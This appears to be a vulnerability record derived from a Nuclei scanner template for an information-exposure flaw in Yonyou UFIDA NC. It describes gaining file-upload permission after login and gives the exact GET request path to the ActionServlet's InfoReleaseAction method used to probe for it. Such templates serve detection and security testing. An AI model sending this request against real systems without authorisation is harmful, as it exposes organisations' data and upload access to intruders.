# Vulnerability: Yonyou UFIDA NC - Information Exposure
**Classification:** YONYOU
**Source:** Nuclei Template (`yonyou-nc-info-leak.yaml`)

## Description
After logging in and visiting the address where the information was leaked, you will have permission to upload files. Then just go back to the homepage and view the published content directly.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?TableSelectedID&TreeSelectedID&action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease
```

